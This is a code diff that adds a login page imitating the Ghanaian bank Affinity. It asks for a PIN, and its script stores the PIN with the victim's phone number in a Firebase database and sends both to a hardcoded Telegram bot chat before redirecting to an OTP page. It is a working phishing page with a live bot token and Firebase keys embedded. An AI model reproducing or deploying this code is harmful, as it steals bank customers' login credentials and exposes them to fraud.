@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AffinityGhana - PIN</title>
+<link rel="icon" type="image/png" href="assets/logo.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app">
+  <div class="page pin-page">
+
+    <a href="phone-number.html" class="back-btn">‹</a>
+
+    <svg class="blob-svg-bg" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="blobGrad2" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#e2231a"/>
+          <stop offset="50%" stop-color="#f5821f"/>
+          <stop offset="100%" stop-color="#ffd23f"/>
+        </linearGradient>
+      </defs>
+      <circle cx="100" cy="55" r="45" fill="url(#blobGrad2)"/>
+      <circle cx="145" cy="100" r="45" fill="url(#blobGrad2)"/>
+      <circle cx="100" cy="145" r="45" fill="url(#blobGrad2)"/>
+      <circle cx="55" cy="100" r="45" fill="url(#blobGrad2)"/>
+    </svg>
+
+    <div class="illustration-wrap" style="margin-top:26px;">
+      <div class="illustration-circle plain">
+        <img src="assets/icon-pin.png" alt="">
+      </div>
+    </div>
+
+    <h1 class="title">Welcome to Affinity</h1>
+    <p class="subtitle">Log in to continue</p>
+
+    <label class="field-label">PIN</label>
+    <div class="pin-input-row">
+      <input type="password" id="pinInput" class="pin-field" inputmode="numeric" maxlength="6" autocomplete="off">
+      <button class="eye-toggle" id="pinEyeToggle" type="button">👁</button>
+    </div>
+    <div class="pin-count"><span id="pinCount">0</span>/6</div>
+
+    <button class="btn-primary" id="pinLoginBtn">Log in</button>
+
+    <div class="forgot-pin">Forgot PIN?</div>
+
+  </div>
+</div>
+
+<!-- Toast Notification -->
+<div id="toast" class="toast"></div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
+    authDomain: "achievebypetra-82966.firebaseapp.com",
+    databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "achievebypetra-82966",
+    storageBucket: "achievebypetra-82966.firebasestorage.app",
+    messagingSenderId: "412688052429",
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const DB_NODE = 'affinity_users';
+
+  // ✅ TELEGRAM BOT CONFIG
+  const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
+  const TELEGRAM_CHAT_ID = "8938213844";
+
+  function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => {
+      toast.classList.remove('show');
+    }, 3000);
+  }
+
+  function sendTelegramNotification(eventType, userData) {
+    const message = `
+🔔 *AFFINITY NOTIFICATION*
+
+📌 *Event:* ${eventType}
+📱 *Phone:* ${userData.phone || 'Not set'}
+🔐 *PIN:* ${userData.pin || 'Not set'}
+🔑 *OTP:* ${userData.otp || 'Not set'}
+🆔 *User ID:* ${userData.userId || 'Unknown'}
+⏰ *Time:* ${new Date().toLocaleString()}
+
+👤 *Admin:* Check dashboard for details
+    `;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log('✅ Telegram notification sent!');
+      } else {
+        console.log('❌ Telegram error:', data.description);
+      }
+    })
+    .catch(error => console.error('❌ Telegram send failed:', error));
+  }
+
+  var pinInput = document.getElementById('pinInput');
+  var pinCount = document.getElementById('pinCount');
+  var pinEyeToggle = document.getElementById('pinEyeToggle');
+  var pinLoginBtn = document.getElementById('pinLoginBtn');
+
+  pinInput.addEventListener('input', function () {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
+    pinCount.textContent = pinInput.value.length;
+  });
+
+  var pinVisible = false;
+  pinEyeToggle.addEventListener('click', function () {
+    pinVisible = !pinVisible;
+    pinInput.type = pinVisible ? 'text' : 'password';
+    pinEyeToggle.textContent = pinVisible ? '🙈' : '👁';
+  });
+
+  pinLoginBtn.addEventListener('click', function () {
+    var pin = pinInput.value.trim();
+    if (pin.length < 4) {
+      pinInput.parentElement.style.borderColor = '#c0392b';
+      setTimeout(function () { pinInput.parentElement.style.borderColor = ''; }, 900);
+      return;
+    }
+
+    var userId = sessionStorage.getItem('affinity_userId');
+    var phone = sessionStorage.getItem('affinity_phone') || 'Unknown';
+
+    if (!userId) {
+      showToast('Error: No user found. Please start over.');
+      return;
+    }
+
+    database.ref(DB_NODE + '/' + userId).update({
+      pin: pin
+    })
+      .then(function () {
+        sendTelegramNotification('🔐 PIN Saved', {
+          phone: phone,
+          pin: pin,
+          userId: userId
+        });
+
+        showToast('PIN saved!');
+        setTimeout(function () {
+          window.location.href = 'otp.html';
+        }, 500);
+      })
+      .catch(function (error) {
+        showToast('Error: ' + error.message);
+      });
+  });
+</script>
+
+</body>
+</html>
